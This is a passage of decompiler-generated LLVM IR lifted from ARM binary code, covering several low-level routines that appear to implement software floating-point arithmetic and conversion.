bb46:                                             ; preds = %bb45, %.thread6
  %v0_18f94 = phi i32 [ %v6_18f90, %.thread6 ], [ %v2_18f8c, %bb45 ]
  %v4_18f94 = udiv i32 %v1_18f94, 8
  %v5_18f94 = sub i32 %v0_18f94, %v4_18f94
  store i32 %v5_18f94, i32* @r3, align 4
  %v2_18f98 = add i32 %v5_18f94, -32
  %v4_18f98 = sub i32 31, %v5_18f94
  %v5_18f98 = and i32 %v4_18f98, %v5_18f94
  %v8_18f98 = icmp eq i32 %v5_18f94, 32
  %v6_18f9c = icmp slt i32 %v5_18f94, 32
  br i1 %v6_18f9c, label %dec_label_pc_18fa0, label %dec_label_pc_18fc0

dec_label_pc_18fa0:                               ; preds = %bb46
  %v2_18fa0 = add i32 %v5_18f94, -20
  %v7_18fa4 = icmp sgt i32 %v2_18f98, -12
  br i1 %v7_18fa4, label %dec_label_pc_18fa8, label %dec_label_pc_18fbc

dec_label_pc_18fa8:                               ; preds = %dec_label_pc_18fa0
  store i32 %v5_18f94, i32* @ip, align 4
  %v1_18fac = sub i32 32, %v5_18f94
  %v6_18fb0 = shl i32 %v0_18fb4, %v5_18f94
  store i32 %v6_18fb0, i32* @r0, align 4
  %v6_18fb4 = lshr i32 %v0_18fb4, %v1_18fac
  store i32 %v6_18fb4, i32* %r1.global-to-local, align 4
  br label %.thread31

dec_label_pc_18fbc:                               ; preds = %dec_label_pc_18fa0
  %v8_18fa0 = icmp eq i32 %v2_18fa0, 0
  %v4_18fa0 = add i32 %v5_18f94, 2147483616
  %v5_18fa0 = and i32 %v2_18fa0, %v4_18fa0
  br label %dec_label_pc_18fc0

dec_label_pc_18fc0:                               ; preds = %bb46, %dec_label_pc_18fbc
  %v1_18fcc.in = phi i32 [ %v2_18f98, %bb46 ], [ %v2_18fa0, %dec_label_pc_18fbc ]
  %v6_18fcc = phi i32 [ %v2_18f98, %bb46 ], [ %v5_18f94, %dec_label_pc_18fbc ]
  %v2_18fcc.in = phi i32 [ %v5_18f98, %bb46 ], [ %v5_18fa0, %dec_label_pc_18fbc ]
  %v0_18fcc = phi i1 [ %v8_18f98, %bb46 ], [ %v8_18fa0, %dec_label_pc_18fbc ]
  %v1_18fcc = icmp slt i32 %v1_18fcc.in, 0
  %v2_18fcc = icmp slt i32 %v2_18fcc.in, 0
  %v3_18fc0 = xor i1 %v2_18fcc, %v1_18fcc
  %v4_18fc0 = or i1 %v0_18fcc, %v3_18fc0
  br i1 %v4_18fc0, label %bb47, label %bb48

bb47:                                             ; preds = %dec_label_pc_18fc0
  %v6_18fc0 = sub i32 32, %v6_18fcc
  store i32 %v6_18fc0, i32* @ip, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_18fc0, %bb47
  %v6_18fc4 = shl i32 %v0_18fb4, %v6_18fcc
  store i32 %v6_18fc4, i32* %r1.global-to-local, align 4
  br i1 %v4_18fc0, label %bb49, label %.thread31

bb49:                                             ; preds = %bb48
  %v6_18fc8 = load i32, i32* @r0, align 4
  %v7_18fc8 = load i32, i32* @ip, align 4
  %v12_18fc8 = lshr i32 %v6_18fc8, %v7_18fc8
  %v13_18fc8 = or i32 %v12_18fc8, %v6_18fc4
  store i32 %v13_18fc8, i32* %r1.global-to-local, align 4
  %v11_18fcc = shl i32 %v6_18fc8, %v6_18fcc
  store i32 %v11_18fcc, i32* @r0, align 4
  br label %.thread31

.thread31:                                        ; preds = %bb48, %dec_label_pc_18fa8, %bb49
  %v6_18fd4 = phi i32 [ %v6_18fb4, %dec_label_pc_18fa8 ], [ %v13_18fc8, %bb49 ], [ %v6_18fc4, %bb48 ]
  %v0_18fd0 = load i32, i32* @r4, align 4
  %v2_18fd0 = sub i32 %v0_18fd0, %v5_18f94
  store i32 %v2_18fd0, i32* %r4.global-to-local, align 4
  %v4_18fd0 = xor i32 %v0_18fd0, %v5_18f94
  %v5_18fd0 = xor i32 %v2_18fd0, %v0_18fd0
  %v6_18fd0 = and i32 %v5_18fd0, %v4_18fd0
  %v7_18fd0 = icmp slt i32 %v6_18fd0, 0
  %v8_18fd0 = icmp slt i32 %v2_18fd0, 0
  %v5_18fd4 = icmp slt i32 %v0_18fd0, %v5_18f94
  br i1 %v5_18fd4, label %.thread8, label %bb50

bb50:                                             ; preds = %.thread31
  %v10_18fd4 = mul i32 %v2_18fd0, 1048576
  %v11_18fd4 = add i32 %v10_18fd4, %v6_18fd4
  %v7_18fd8 = load i32, i32* @r5, align 4
  %v8_18fd8 = or i32 %v7_18fd8, %v11_18fd4
  store i32 %v8_18fd8, i32* %r1.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread31, %bb50
  %v3_18fe0 = xor i1 %v8_18fd0, %v7_18fd0
  %v4_18fe0 = xor i1 %v3_18fe0, true
  call void @__pseudo_cond_branch(i1 %v4_18fe0, i32 %tmp33)
  %v0_18fe4 = load i32, i32* %r4.global-to-local, align 4
  %v2_18fe8 = sub i32 -32, %v0_18fe4
  store i32 %v2_18fe8, i32* %r4.global-to-local, align 4
  %v6_18fec = icmp sgt i32 %v0_18fe4, -32
  br i1 %v6_18fec, label %dec_label_pc_18ff0, label %dec_label_pc_19030

dec_label_pc_18ff0:                               ; preds = %.thread8
  %v1_18ff0 = add i32 %v2_18fe8, 12
  store i32 %v1_18ff0, i32* %r4.global-to-local, align 4
  %v8_18ff4 = icmp sgt i32 %v1_18ff0, 0
  br i1 %v8_18ff4, label %dec_label_pc_19014, label %dec_label_pc_18ff8

dec_label_pc_18ff8:                               ; preds = %dec_label_pc_18ff0
  %v1_18ff8 = add i32 %v2_18fe8, 32
  %v1_18ffc = sub i32 0, %v2_18fe8
  %v0_19000 = load i32, i32* @r0, align 4
  %v6_19000 = lshr i32 %v0_19000, %v1_18ff8
  %v1_19004 = load i32, i32* %r1.global-to-local, align 4
  %v7_19004 = shl i32 %v1_19004, %v1_18ffc
  %v8_19004 = or i32 %v7_19004, %v6_19000
  %v0_19008 = load i32, i32* @r5, align 4
  %v7_19008 = lshr i32 %v1_19004, %v1_18ff8
  %v8_19008 = or i32 %v0_19008, %v7_19008
  store i32 %v8_19008, i32* @r1, align 4
  %v2_1900c = load i32, i32* %stack_var_12, align 4
  store i32 %v2_1900c, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @lr, align 4
  ret i32 %v8_19004

dec_label_pc_19014:                               ; preds = %dec_label_pc_18ff0
  %v1_19014 = sub i32 0, %v2_18fe8
  %v1_19018 = add i32 %v2_18fe8, 32
  %v0_1901c = load i32, i32* @r0, align 4
  %v6_1901c = lshr i32 %v0_1901c, %v1_19018
  %v1_19020 = load i32, i32* %r1.global-to-local, align 4
  %v7_19020 = shl i32 %v1_19020, %v1_19014
  %v8_19020 = or i32 %v7_19020, %v6_1901c
  %v0_19024 = load i32, i32* @r5, align 4
  store i32 %v0_19024, i32* @r1, align 4
  %v2_19028 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_19028, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @lr, align 4
  ret i32 %v8_19020

dec_label_pc_19030:                               ; preds = %.thread8
  %v0_19030 = load i32, i32* %r1.global-to-local, align 4
  %v6_19030 = lshr i32 %v0_19030, %v2_18fe8
  %v0_19034 = load i32, i32* @r5, align 4
  store i32 %v0_19034, i32* @r1, align 4
  %v2_19038 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_19038, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @lr, align 4
  ret i32 %v6_19030

; uselistorder directives
  uselistorder i32 %v2_18fe8, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v2_18fd0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_18fd0, { 2, 0, 1, 3 }
  uselistorder i32 %v6_18fc4, { 1, 0, 2 }
  uselistorder i32 %v2_18f98, { 1, 0, 2 }
  uselistorder i32 %v5_18f94, { 6, 0, 5, 7, 3, 9, 2, 8, 4, 10, 11, 1, 13, 12, 14 }
  uselistorder i32 %v4_18f80, { 1, 0 }
  uselistorder i32 %v1_18f80, { 1, 0, 2, 3 }
  uselistorder i32 %v4_18f74, { 1, 0 }
  uselistorder i32 %v1_18f74, { 1, 0, 2, 3 }
  uselistorder i32 %v4_18f68, { 1, 0 }
  uselistorder i32 %v0_18fb4, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder i32* %r1.global-to-local, { 5, 3, 4, 0, 1, 2, 6, 7 }
  uselistorder i32 -12, { 1, 2, 14, 15, 3, 17, 18, 4, 19, 20, 16, 13, 12, 11, 10, 9, 21, 22, 23, 24, 8, 5, 7, 6, 25, 26, 27, 0 }
  uselistorder i32 -20, { 0, 2, 1 }
  uselistorder i32 -2, { 12, 18, 3, 5, 6, 4, 13, 14, 15, 0, 9, 8, 16, 20, 21, 22, 23, 7, 1, 11, 10, 19, 17, 2 }
  uselistorder i32 -4, { 18, 2, 19, 45, 46, 47, 48, 49, 50, 0, 1, 51, 20, 55, 21, 22, 73, 74, 75, 6, 23, 24, 25, 76, 77, 78, 7, 26, 27, 28, 79, 80, 81, 8, 29, 30, 82, 17, 16, 83, 84, 85, 15, 14, 13, 12, 31, 32, 33, 34, 35, 5, 36, 3, 37, 4, 86, 11, 38, 52, 53, 54, 39, 10, 60, 61, 62, 9, 63, 64, 65, 40, 59, 66, 67, 68, 69, 70, 71, 41, 72, 56, 57, 58, 42, 43, 44 }
  uselistorder i32 15, { 11, 12, 0, 14, 7, 8, 9, 10, 1, 16, 15, 2, 13, 3, 4, 5, 6 }
  uselistorder i32 -8, { 20, 41, 21, 22, 23, 42, 24, 25, 26, 27, 28, 29, 19, 18, 12, 17, 16, 15, 14, 30, 31, 32, 33, 34, 45, 46, 35, 36, 47, 37, 48, 40, 13, 38, 39, 1, 43, 44, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 128, { 12, 11, 13, 0, 1, 2, 6, 7, 15, 16, 17, 3, 4, 8, 18, 5, 14, 9, 19, 10 }
  uselistorder i32 255, { 6, 7, 4, 5, 9, 0, 1, 2, 3, 10, 11, 8 }
  uselistorder i32 -16, { 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 5, 4, 3, 1, 16, 17, 18, 19, 20, 21, 2, 0, 22 }
  uselistorder i32 65536, { 0, 1, 2, 3, 4, 5, 7, 6, 12, 8, 13, 9, 14, 10, 15, 11, 16, 17, 18, 22, 19, 23, 20, 24, 21, 25, 27, 26, 28, 69, 70, 68, 71, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 38, 40, 42, 41, 43, 44, 45, 46, 47, 49, 48, 50, 53, 52, 51, 54, 55, 58, 57, 56, 59, 61, 62, 60, 63, 65, 66, 64, 67 }
  uselistorder i32 32768, { 5, 4, 1, 6, 2, 0, 3 }
  uselistorder i32 65535, { 2, 3, 1, 4, 0 }
  uselistorder i32 52, { 1, 16, 10, 3, 5, 4, 6, 11, 12, 13, 7, 14, 15, 19, 20, 2, 21, 0, 22, 23, 8, 9, 17, 18 }
  uselistorder i32 20, { 8, 50, 2, 59, 15, 46, 51, 52, 16, 53, 17, 73, 13, 74, 75, 4, 76, 54, 18, 1, 0, 9, 19, 20, 21, 22, 23, 60, 61, 24, 25, 55, 26, 27, 56, 57, 58, 47, 28, 29, 48, 49, 3, 30, 31, 77, 32, 33, 34, 35, 36, 37, 78, 38, 39, 40, 41, 5, 10, 62, 63, 64, 65, 42, 43, 66, 67, 68, 69, 70, 7, 6, 14, 12, 71, 11, 44, 72, 45 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread31, { 2, 0, 1 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_18fc0, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_19040(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_19040:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_19040 = load i32, i32* @r4, align 4
  %v2_19040 = icmp eq i32 %v0_19040, 0
  %v1_19044 = xor i32 %arg3, 1048576
  store i32 %v1_19044, i32* @r3, align 4
  br i1 %v2_19040, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_19040
  %v1_19048 = load i32, i32* @r1, align 4
  %v2_19048 = xor i32 %v1_19048, 1048576
  store i32 %v2_19048, i32* @r1, align 4
  store i32 1, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_19040
  %v1_19050 = load i32, i32* @r5, align 4
  %v2_19050 = add i32 %v1_19050, -1
  store i32 %v2_19050, i32* @r5, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_19054 = call i32 @function_18e98()
  store i32 %v0_19054, i32* %r0.global-to-local, align 4
  %v0_19058 = load i32, i32* @r4, align 4
  %v0_19058.off = add i32 %v0_19058, 4194303
  %tmp = icmp ult i32 %v0_19058.off, 2097152
  %v1_190e8 = load i32, i32* @r5, align 4
  %v1_190e8.off = add i32 %v1_190e8, 4194303
  %tmp44 = icmp ult i32 %v1_190e8.off, 2097152
  br i1 %tmp, label %.thread11, label %bb30

bb30:                                             ; preds = %bb
  br i1 %tmp44, label %bb37, label %dec_label_pc_19064

dec_label_pc_19064:                               ; preds = %bb30
  %v4_19064 = icmp eq i32 %v1_190e8, %v0_19058
  br i1 %v4_19064, label %bb31, label %dec_label_pc_19070

bb31:                                             ; preds = %dec_label_pc_19064
  %v2_19068 = load i32, i32* @r2, align 4
  %v5_19068 = icmp eq i32 %v2_19068, %v0_19054
  br i1 %v5_19068, label %dec_label_pc_19084, label %dec_label_pc_19070

dec_label_pc_19070:                               ; preds = %dec_label_pc_19064, %bb31
  %v2_19070 = or i32 %v0_19058, %v0_19054
  %v4_19070 = icmp eq i32 %v2_19070, 0
  br i1 %v4_19070, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_19070
  %v1_19078 = load i32, i32* @r2, align 4
  store i32 %v1_19078, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_19070, %bb32
  %v1_19080 = phi i32 [ %v0_19054, %dec_label_pc_19070 ], [ %v1_19078, %bb32 ]
  ret i32 %v1_19080

dec_label_pc_19084:                               ; preds = %bb31
  %v0_19084 = load i32, i32* @r1, align 4
  %v1_19084 = load i32, i32* @r3, align 4
  %v4_19084 = icmp eq i32 %v1_19084, %v0_19084
  br i1 %v4_19084, label %dec_label_pc_19084..thread8_crit_edge, label %bb33

dec_label_pc_19084..thread8_crit_edge:            ; preds = %dec_label_pc_19084
  %v0_19094.pre = load i32, i32* @lr, align 4
  br label %.thread8

bb33:                                             ; preds = %dec_label_pc_19084
  store i32 0, i32* @r1, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r4, align 4
  store i32 %arg6, i32* @lr, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_19084..thread8_crit_edge, %bb33
  %v0_19094 = phi i32 [ %v0_19094.pre, %dec_label_pc_19084..thread8_crit_edge ], [ %arg6, %bb33 ]
  %v2_19094 = xor i1 %v4_19084, true
  call void @__pseudo_cond_branch(i1 %v2_19094, i32 %v0_19094)
  %v0_19098 = load i32, i32* @r4, align 4
  %tmp45 = icmp ult i32 %v0_19098, 2097152
  br i1 %tmp45, label %dec_label_pc_190a0, label %dec_label_pc_190b4

dec_label_pc_190a0:                               ; preds = %.thread8
  %v0_190a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_190a0 = icmp slt i32 %v0_190a0, 0
  %v2_190a0 = mul i32 %v0_190a0, 2
  store i32 %v2_190a0, i32* %r0.global-to-local, align 4
  %v0_190a4 = load i32, i32* @r1, align 4
  %v3_190a4 = mul i32 %v0_190a4, 2
  %v4_190a4 = zext i1 %v1_190a0 to i32
  %v5_190a4 = or i32 %v3_190a4, %v4_190a4
  %v9_190a4 = icmp ule i32 %v5_190a4, %v0_190a4
  %v10_190a4 = icmp ult i32 %v3_190a4, %v0_190a4
  %v11_190a4 = select i1 %v1_190a0, i1 %v9_190a4, i1 %v10_190a4
  br i1 %v11_190a4, label %bb34, label %bb35

bb34:                                             ; preds = %dec_label_pc_190a0
  br label %bb35

bb35:                                             ; preds = %dec_label_pc_190a0, %bb34
  ret i32 %v2_190a0

dec_label_pc_190b4:                               ; preds = %.thread8
  %v2_190b4 = icmp ugt i32 %v0_19098, -4194305
  br i1 %v2_190b4, label %dec_label_pc_190b4..thread9_crit_edge, label %bb36

dec_label_pc_190b4..thread9_crit_edge:            ; preds = %dec_label_pc_190b4
  %v0_190c0.pre = load i32, i32* @lr, align 4
  br label %.thread9

bb36:                                             ; preds = %dec_label_pc_190b4
  %v1_190b8 = load i32, i32* @r1, align 4
  %v2_190b8 = add i32 %v1_190b8, 1048576
  store i32 %v2_190b8, i32* @r1, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_190b4..thread9_crit_edge, %bb36
  %v0_190c0 = phi i32 [ %v0_190c0.pre, %dec_label_pc_190b4..thread9_crit_edge ], [ %arg9, %bb36 ]
  %v2_190c0 = xor i1 %v2_190b4, true
  call void @__pseudo_cond_branch(i1 %v2_190c0, i32 %v0_190c0)
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

.thread11:                                        ; preds = %bb
  %v1_190f4.pre = load i32, i32* @r1, align 4
  br i1 %tmp44, label %.thread13, label %.thread14

.thread14:                                        ; preds = %.thread11
  store i32 %v1_190f4.pre, i32* @r3, align 4
  br label %bb38

bb37:                                             ; preds = %bb30
  %v1_190e0 = load i32, i32* @r3, align 4
  %v1_190e4 = load i32, i32* @r2, align 4
  store i32 %v1_190e4, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %bb37, %.thread14
  %v1_190f423 = phi i32 [ %v1_190f4.pre, %.thread14 ], [ %v1_190e0, %bb37 ]
  %v1_190f0 = phi i32 [ %v0_19054, %.thread14 ], [ %v1_190e4, %bb37 ]
  store i32 %v1_190f0, i32* @r2, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread11, %bb38
  %v1_19100 = phi i32 [ %v1_190f423, %bb38 ], [ %v1_190f4.pre, %.thread11 ]
  %v1_19108 = phi i32 [ %v1_190f0, %bb38 ], [ %v0_19054, %.thread11 ]
  %v4_190f4 = mul i32 %v1_19100, 4096
  %v5_190f4 = or i32 %v4_190f4, %v1_19108
  %v7_190f4 = icmp eq i32 %v5_190f4, 0
  br i1 %v7_190f4, label %bb39, label %.thread17

bb39:                                             ; preds = %.thread13
  %v1_190f8 = load i32, i32* @r2, align 4
  %v2_190f8 = load i32, i32* @r3, align 4
  %v5_190f8 = mul i32 %v2_190f8, 4096
  %v6_190f8 = or i32 %v5_190f8, %v1_190f8
  %v8_190f8 = icmp eq i32 %v6_190f8, 0
  br i1 %v8_190f8, label %bb40, label %.thread17

bb40:                                             ; preds = %bb39
  %v5_190fc = icmp eq i32 %v2_190f8, %v1_19100
  br i1 %v5_190fc, label %bb41, label %.thread17

.thread17:                                        ; preds = %.thread13, %bb39, %bb40
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread17
  ret i32 %v1_19108

; uselistorder directives
  uselistorder i32 %v1_190f4.pre, { 0, 2, 1 }
  uselistorder i32 %v0_190a4, { 1, 2, 0 }
  uselistorder i32 %v2_190a0, { 1, 0 }
  uselistorder i1 %v1_190a0, { 1, 0 }
  uselistorder i32 %v0_19098, { 1, 0 }
  uselistorder i1 %v4_19084, { 1, 0 }
  uselistorder i32 %v0_19058, { 2, 0, 1 }
  uselistorder i32 %v0_19054, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %.thread17, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_19070, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_1910c() local_unnamed_addr {
dec_label_pc_1910c:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v0_1910c = load i32, i32* @r0, align 4
  %v2_1910c = icmp eq i32 %v0_1910c, 0
  br i1 %v2_1910c, label %bb, label %bb18

bb:                                               ; preds = %dec_label_pc_1910c
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_1910c, %bb
  %v0_19114 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1910c, i32 %v0_19114)
  store i32 1074, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* @r1, align 4
  %v0_1912c = call i32 @function_18f4c()
  store i32 %v0_1912c, i32* @r0, align 4
  %v2_19130 = icmp eq i32 %v0_1912c, 0
  br i1 %v2_19130, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  %v0_19138 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_19130, i32 %v0_19138)
  store i32 1074, i32* @r4, align 4
  %v1_19148 = and i32 %v0_1912c, -2147483648
  store i32 %v1_19148, i32* @r5, align 4
  %v2_19148 = icmp eq i32 %v1_19148, 0
  br i1 %v2_19148, label %bb22, label %bb21

bb21:                                             ; preds = %bb20
  %v2_1914c = sub i32 0, %v0_1912c
  store i32 %v2_1914c, i32* @r0, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  store i32 0, i32* @r1, align 4
  %v0_19154 = call i32 @function_18f4c()
  %v2_19158 = mul i32 %v0_19154, 2
  store i32 %v2_19158, i32* %r2.global-to-local, align 4
  %v4_19158 = icmp eq i32 %v2_19158, 0
  %v1_1915c = and i32 %v2_19158, 4
  %v2_1915c = icmp ne i32 %v1_1915c, 0
  %v3_1915c = sdiv i32 %v2_19158, 8
  %v3_19160 = zext i1 %v2_1915c to i32
  %v6_19160 = zext i32 %v3_1915c to i64
  %v7_19160 = sub nsw i32 33, %v3_1915c
  %v8_19160 = zext i32 %v7_19160 to i64
  %v9_19160 = shl i64 %v6_19160, %v8_19160
  %v10_19160 = sub nsw i32 32, %v3_1915c
  %v11_19160 = shl i32 %v3_19160, %v10_19160
  %v12_19160 = zext i32 %v11_19160 to i64
  %v14_19160 = or i64 %v12_19160, %v9_19160
  %v15_19160 = trunc i64 %v14_19160 to i32
  store i32 %v15_19160, i32* %r1.global-to-local, align 4
  %v3_19164 = mul i32 %v0_19154, 536870912
  store i32 %v3_19164, i32* @r0, align 4
  br i1 %v4_19158, label %.thread1, label %bb23

bb23:                                             ; preds = %bb22
  %v2_19168 = and i32 %v2_19158, -16777216
  store i32 %v2_19168, i32* @r3, align 4
  %v4_19168 = icmp eq i32 %v2_19168, 0
  br i1 %v4_19168, label %.thread1, label %bb24

bb24:                                             ; preds = %bb23
  %v4_1916c = icmp ugt i32 %v2_19158, -16777217
  br i1 %v4_1916c, label %.thread1, label %bb25

bb25:                                             ; preds = %bb24
  %v2_19170 = xor i32 %v15_19160, 939524096
  store i32 %v2_19170, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %bb22, %bb23, %bb24, %bb25
  %v1_19174 = phi i1 [ false, %bb23 ], [ false, %bb24 ], [ true, %bb25 ], [ false, %bb22 ]
  %v0_19174 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_19174, i32 %v0_19174)
  %v0_19178 = load i32, i32* %r2.global-to-local, align 4
  %v2_19178 = icmp eq i32 %v0_19178, 0
  br i1 %v2_19178, label %dec_label_pc_191c8, label %bb26

bb26:                                             ; preds = %.thread1
  %v1_1917c = load i32, i32* @r3, align 4
  %v4_1917c = icmp eq i32 %v1_1917c, -16777216
  br label %dec_label_pc_191c8

dec_label_pc_191c8:                               ; preds = %.thread1, %bb26
  %v1_19180 = phi i1 [ true, %.thread1 ], [ %v4_1917c, %bb26 ]
  %v0_19180 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_19180, i32 %v0_19180)
  store i32 896, i32* @r4, align 4
  %v0_1918c = load i32, i32* %r1.global-to-local, align 4
  %v1_1918c = and i32 %v0_1918c, -2147483648
  store i32 %v1_1918c, i32* @r5, align 4
  %tmp = bitcast i32 %v0_1918c to float
  %tmp32 = call float @fabsf(float %tmp)
  %v1_19190 = bitcast float %tmp32 to i32
  store i32 %v1_19190, i32* @r1, align 4
  %v0_19194 = call i32 @function_18f4c()
  %v1_19198 = load i32, i32* @r1, align 4
  %v2_19198 = or i32 %v1_19198, %v0_19194
  store i32 %v2_19198, i32* %r2.global-to-local, align 4
  %v4_19198 = icmp eq i32 %v2_19198, 0
  %v0_1919c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_19198, i32 %v0_1919c)
  store i32 0, i32* @r5, align 4
  store i32 1074, i32* %r4.global-to-local, align 4
  %v0_191d0 = load i32, i32* @r1, align 4
  %tmp33 = icmp ult i32 %v0_191d0, 4194304
  call void @__pseudo_cond_branch(i1 %tmp33, i32 ptrtoint (i32* @global_var_18eec.544 to i32))
  %tmp34 = icmp ult i32 %v0_191d0, 33554432
  br i1 %tmp34, label %bb28, label %bb27

bb27:                                             ; preds = %dec_label_pc_191c8
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_191c8, %bb27
  %v1_191e8 = phi i32 [ 6, %bb27 ], [ 3, %dec_label_pc_191c8 ]
  %tmp35 = icmp ult i32 %v0_191d0, 268435456
  br i1 %tmp35, label %bb30, label %bb29

bb29:                                             ; preds = %bb28
  %v2_191e8 = add nuw nsw i32 %v1_191e8, 3
  br label %bb30

bb30:                                             ; preds = %bb28, %bb29
  %v0_191ec = phi i32 [ %v2_191e8, %bb29 ], [ %v1_191e8, %bb28 ]
  %not. = icmp slt i32 %v0_191d0, 0
  %v4_191ec = zext i1 %not. to i32
  %v5_191ec = add nsw i32 %v0_191ec, %v4_191ec
  store i32 %v5_191ec, i32* %r2.global-to-local, align 4
  %v1_191f0 = sub nsw i32 32, %v5_191ec
  %v6_191f4 = shl i32 %v0_19194, %v1_191f0
  store i32 %v6_191f4, i32* @ip, align 4
  %v6_191f8 = lshr i32 %v0_19194, %v5_191ec
  %v1_191fc = load i32, i32* @r1, align 4
  %v7_191fc = shl i32 %v1_191fc, %v1_191f0
  %v8_191fc = or i32 %v7_191fc, %v6_191f8
  %v6_19200 = lshr i32 %v1_191fc, %v5_191ec
  store i32 %v6_19200, i32* %r1.global-to-local, align 4
  %v0_19204 = load i32, i32* %r4.global-to-local, align 4
  %v2_19204 = add i32 %v0_19204, %v5_191ec
  store i32 %v2_19204, i32* @r4, align 4
  %v4_19208 = sext i32 %v8_191fc to i64
  %v5_19208 = call i32 @function_18eec(i64 %v4_19208, i32 %v6_19200, i32 %v5_191ec, i32 %v1_191f0)
  ret i32 %v5_19208

; uselistorder directives
  uselistorder i32 %v5_191ec, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %v0_19194, { 1, 2, 0 }
  uselistorder i32 %v3_1915c, { 1, 2, 0 }
  uselistorder i32 %v2_19158, { 0, 4, 5, 3, 2, 1 }
  uselistorder i32* %r1.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 3, { 46, 0, 43, 59, 44, 50, 1, 10, 2, 3, 57, 51, 4, 5, 35, 36, 66, 37, 38, 39, 40, 41, 42, 52, 8, 19, 53, 47, 20, 48, 9, 49, 67, 14, 62, 17, 63, 16, 64, 18, 56, 11, 54, 12, 7, 13, 55, 6, 65, 45, 21, 22, 23, 58, 24, 25, 60, 26, 28, 27, 34, 29, 61, 30, 31, 32, 33, 15 }
  uselistorder i32 6, { 0, 13, 14, 4, 5, 18, 3, 1, 6, 15, 2, 7, 8, 9, 10, 11, 16, 12, 17 }
  uselistorder i32 ()* @function_18f4c, { 2, 1, 0 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %dec_label_pc_191c8, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @function_1920c(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1920c:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = sext i32 %arg3 to i64
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp32 = trunc i64 %arg1 to i32
  store i32 %tmp32, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1920c = load i32, i32* @r4, align 4
  store i32 %v3_1920c, i32* %stack_var_-16, align 4
  %v6_1920c = load i32, i32* @r5, align 4
  %v9_1920c = load i32, i32* @r6, align 4
  %v12_1920c = load i32, i32* @lr, align 4
  store i32 2047, i32* @ip, align 4
  %v4_19218 = udiv i32 %arg2, 1048576
